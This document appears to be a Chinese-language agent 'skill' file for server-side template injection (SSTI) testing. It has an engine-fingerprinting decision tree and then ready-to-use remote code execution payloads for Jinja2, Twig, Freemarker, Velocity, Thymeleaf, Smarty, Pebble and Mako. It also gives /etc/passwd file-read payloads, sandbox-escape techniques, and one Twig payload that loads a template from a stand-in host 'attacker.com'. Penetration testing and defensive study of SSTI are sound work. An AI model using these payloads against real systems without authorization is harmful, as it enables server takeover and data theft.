---
name: template-injection
description: >
  服务端模版注入(SSTI)漏洞测试技能。提供模版引擎指纹识别决策树，覆盖
  Jinja2/Twig/Freemarker/Velocity/Thymeleaf/Smarty/Pebble/Mako 等主流引擎的
  PoC 探测与 RCE Payload，包含沙箱逃逸技术和系统化测试流程(CWE-1336)。
---

# 服务端模版注入(SSTI)测试技能

系统化检测和验证 Web 应用中的服务端模版注入漏洞。
通过模版表达式探针注入、引擎指纹识别和逐步升级的利用链，
定位模版引擎中的代码执行路径。

---

## 1. SSTI 原理

当用户输入被直接嵌入模版字符串而非作为模版变量传入时，攻击者可以注入模版指令，
在服务端执行任意代码。

```python
# 安全用法（参数化）
render_template("hello.html", name=user_input)

# 危险用法（字符串拼接）
render_template_string("Hello " + user_input)
```

---

## 2. 引擎识别决策树

使用分层探针识别目标模版引擎：

```
Step 1: 注入 ${7*7}
  ├── 返回 49 → 可能是 Freemarker, Mako, 或 EL 表达式
  │     └── 注入 ${7*'7'}
  │           ├── 返回 7777777 → Freemarker (字符串重复)
  │           ├── 返回 49 → Mako 或 EL
  │           └── 报错 → 尝试 Thymeleaf
  └── 返回 ${7*7} (原样) → 继续

Step 2: 注入 {{7*7}}
  ├── 返回 49 → 可能是 Jinja2, Twig, Nunjucks, 或 Smarty
  │     └── 注入 {{7*'7'}}
  │           ├── 返回 7777777 → Jinja2 或 Twig
  │           │     └── 注入 {% debug %}
  │           │           ├── 有输出 → Jinja2
  │           │           └── 报错 → Twig
  │           └── 返回 49 → Smarty 或 Nunjucks
  └── 返回 {{7*7}} (原样) → 继续

Step 3: 注入 #{7*7}
  ├── 返回 49 → 可能是 Thymeleaf, Pebble, 或 Ruby ERB
  └── 返回原样 → 继续

Step 4: 注入 <%= 7*7 %>
  ├── 返回 49 → ERB (Ruby) 或 JSP/ASP
  └── 返回原样 → 继续

Step 5: 注入 #set($x=7*7)${x}
  ├── 返回 49 → Velocity
  └── 返回原样 → 可能不存在 SSTI
```

### 通用探针集

按优先级使用以下探针：

```
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
{{7*'7'}}
${7*'7'}
${{7*7}}
#{7*7}
*{7*7}
```

---

## 3. 各引擎 Payload

### 3.1 Jinja2 (Python)

**信息探测**
```
{{config}}
{{config.items()}}
{{self.__class__.__mro__}}
{{request.environ}}
```

**RCE Payload**

通过 MRO 链查找可用类：
```
{{''.__class__.__mro__[1].__subclasses__()}}
```

经典 RCE：
```
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}
```

其中 INDEX 需要找到 `subprocess.Popen` 的位置。

自动查找 Popen 索引：
```
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{% if c.__name__ == 'Popen' %}
{{ c('id',shell=True,stdout=-1).communicate() }}
{% endif %}
{% endfor %}
```

其他 RCE 路径：
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

**文件读取**
```
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('/etc/passwd').read()}}
```

### 3.2 Twig (PHP)

**信息探测**
```
{{_self.env.display('id')}}
{{app.request.server.all|join(',')}}
```

**RCE Payload (Twig < 1.20)**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**RCE Payload (Twig 1.x)**
```
{{_self.env.setCache("ftp://attacker.com")}}{{_self.env.loadTemplate("evil")}}
```

**RCE Payload (Twig 3.x)**
```
{{['id']|filter('system')}}
{{['id']|map('system')}}
{{['id']|reduce('system')}}
{{['id','']|sort('system')}}
```

### 3.3 Freemarker (Java)

**信息探测**
```
${.version}
${.data_model}
```

**RCE Payload**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**文件读取**
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

**利用 ObjectConstructor**
```
<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

### 3.4 Velocity (Java)

**信息探测**
```
#set($x=7*7)${x}
$class.inspect("java.lang.Runtime")
```

**RCE Payload**
```
#set($runtime=Class.forName("java.lang.Runtime"))
#set($getRuntime=$runtime.getMethod("getRuntime",null))
#set($invoke=$getRuntime.invoke(null,null))
#set($exec=$invoke.exec("id"))
$exec.waitFor()
#set($is=$exec.getInputStream())
```

**简化 RCE**
```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### 3.5 Thymeleaf (Java/Spring)

**信息探测**
```
${T(java.lang.System).getenv()}
```

**RCE Payload（表达式注入）**
```
${T(java.lang.Runtime).getRuntime().exec('id')}
```

**URL 路径注入**
```
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

**预处理表达式**
```
#{T(java.lang.Runtime).getRuntime().exec('id')}
```

### 3.6 Smarty (PHP)

**信息探测**
```
{$smarty.version}
{$smarty.template}
```

**RCE Payload**
```
{system('id')}
{php}system('id');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id');?>",self::clearConfig())}
```

**Smarty 3.x**
```
{literal}<script>alert(1)</script>{/literal}
{if system('id')}{/if}
```

### 3.7 Pebble (Java)

**RCE Payload**
```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
```

### 3.8 Mako (Python)

**RCE Payload**
```
<%import os%>${os.popen('id').read()}
${self.module.cache.util.os.popen('id').read()}
```

---

## 4. 沙箱逃逸

### 4.1 Jinja2 沙箱逃逸

当 `SandboxedEnvironment` 被启用时：

```
{{''.__class__.__mro__[1].__subclasses__()}}
```

查找未被沙箱限制的类（如 `warnings.catch_warnings`, `_io.FileIO` 等），
通过这些类的 `__init__.__globals__` 访问 `os` 模块。

### 4.2 Freemarker 沙箱逃逸

当 `TemplateClassResolver` 限制类访问时：
- 利用已允许的类（如 `ObjectConstructor`、`Execute`）
- 通过反射链绕过白名单

### 4.3 通用逃逸思路

1. 枚举可用对象的类层次结构
2. 查找能访问 `Runtime` 或 `ProcessBuilder` 的路径
3. 利用反射（Java）或 MRO 链（Python）绕过直接访问限制
4. 寻找可读写文件的类作为中间跳板

---

## 5. 测试检查清单

- [ ] 使用通用探针集（`{{7*7}}`, `${7*7}`, `<%= 7*7 %>` 等）检测注入
- [ ] 根据响应差异识别模版引擎类型
- [ ] 使用引擎特定的信息探测 Payload 确认
- [ ] 尝试 RCE Payload 评估影响
- [ ] 如果存在沙箱，尝试逃逸
- [ ] 检查模版是否在错误消息中泄露引擎信息
- [ ] 测试 HTTP Header、URL 路径等非常规注入点
- [ ] 记录完整的引擎类型、注入点和利用链
